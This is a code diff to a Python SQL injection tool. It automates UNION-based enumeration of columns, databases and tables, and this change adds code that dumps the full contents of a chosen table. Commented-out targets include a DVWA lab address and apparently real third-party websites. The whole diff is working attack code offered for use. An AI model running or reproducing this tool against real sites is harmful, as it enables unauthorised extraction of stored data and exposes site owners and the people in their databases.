@@ -6,6 +6,7 @@ import time
 from urllib.parse import urlparse,urlunparse
 import sys
 import difflib
+from tabulate import tabulate
 #req = 'http://192.168.43.172/dvwa/vulnerabilities/sqli/?id=1'
 #req = 'http://ami.edu.pk/page.php?p_id=100'
 #req = 'http://achromicpoint.com/past-event.php?id=186'
@@ -48,9 +49,9 @@ def fetch(url=req,parameter=""):
         
 
 def vuln_ids(url):
-        print('*'*10)
+        print('*'*20)
         print('Finding the number of columns')
-        print('*'*10)
+        print('*'*20)
         norm_body = fetch(url)
         for i in range(1,20):
                 query = '%20order%20by%20'+str(i)+'--+'
@@ -62,10 +63,10 @@ def vuln_ids(url):
                 if len(body) < len(norm_body):
                         print("Number of columns present")
                         break
-        return i
+        return i-1
 
 def vuln_colm(url,num_id):
-        print('*'*10)
+        print('*'*20)
         global query_url
         print("Finding vulnerable columns")
         union = ['%20UNION%20SELECT%201']
@@ -96,7 +97,9 @@ def vuln_colm(url,num_id):
                         if line.startswith(prefix):
                                 break
                 else:
-                        vuln_id.append(line.strip('+'))
+                        line1 = line.strip('+')
+                        if line1 not in vuln_id:
+                                vuln_id.append(line1)
         print(vuln_id)
         print('*'*10)
         return vuln_id
@@ -162,11 +165,13 @@ def table_name(url,db_name):
         return tabl
 
 def column_name(url,tab_name):
+        print(url)
+        table = tab_name.encode("utf-8").hex()
         parse = urlparse(query_url)
         vul_query = parse.query.replace(vuln_id,'GROUP_CONCAT(column_name)')
         parse = parse._replace(query=vul_query)
         print('*'*10)
-        vul_query = parse.query.replace('--+','%20FROM%20information_schema.columns%20WHERE%20table_name=0x'+str(tab_name)+'%20--+')
+        vul_query = parse.query.replace('--+','%20FROM%20information_schema.columns%20WHERE%20table_name=0x'+str(table)+'%20--+')
         parse = parse._replace(query=vul_query)
         url = urlunparse(parse)
         fin3 =fetch(url)
@@ -192,8 +197,38 @@ def column_name(url,tab_name):
         for x in colm:
                 print(x)
         print('-'*20)
-        
-                            
+        column = ',0x3a,'.join(colm)
+        parse = urlparse(query_url)
+        vul_query = parse.query.replace(vuln_id,'GROUP_CONCAT('+str(column)+')')
+        parse = parse._replace(query=vul_query)
+        print('*'*10)
+        vul_query = parse.query.replace('--+','%20FROM%20'+str(tab_name)+'%20--+')
+        parse = parse._replace(query=vul_query)
+        url = urlunparse(parse)
+        #print(url)
+        fin3 =fetch(url)
+        with open("columns.txt",'w') as file4:
+            file4.write(fin3)
+        with open("vuln_id.txt") as f1:
+                f1_text = f1.read()
+        with open("columns.txt") as f2:
+                f2_text = f2.read()
+        vuln_tbl = []
+        for line in difflib.unified_diff(f1_text,f2_text, fromfile='vuln_id.txt',tofile='columns.txt', lineterm='',n=0):
+            for prefix in ('---','+++','@@','-'):
+                if line.startswith(prefix):
+                    break
+            else:
+                #print(line)
+                vuln_tbl.append(line.strip('+'))
+        dat = ''.join(vuln_tbl)
+        data = list(dat.split(','))
+        j =[]
+        l =[]
+        for i in data:
+                j = i.split(':')
+                l.append(j)
+        print(tabulate(l,headers=colm,tablefmt='orgtbl'))
               
 def error_based(url,body):
         fullbody = fetch(url)
@@ -203,12 +238,12 @@ def error_based(url,body):
                 return 1
 
 def blind_based(url):
-        print('*'*10)
+        print('*'*20)
         print("Performing Blind SQL Injection")
-        print('*'*10)
+        print('*'*20)
         num_colm = vuln_ids(url)
         print(num_colm)
-        db_colm = vuln_colm(url,num_colm)
+        db_colm = vuln_colm(url,num_colm+1)
         db_name = vul_db(url,db_colm)
         print("Database present :"+str(db_name))
         tables = table_name(url,db_name)
@@ -216,7 +251,7 @@ def blind_based(url):
         for i in tables:
             print(str(tables.index(i))+"-"+i)
         ind = int(input())
-        table = tables[ind].encode("utf-8").hex()
+        table = tables[ind]
         column_name(url,table)
         choice = int(input("1:Continue\n:2Exit"))
         if choice is 1:
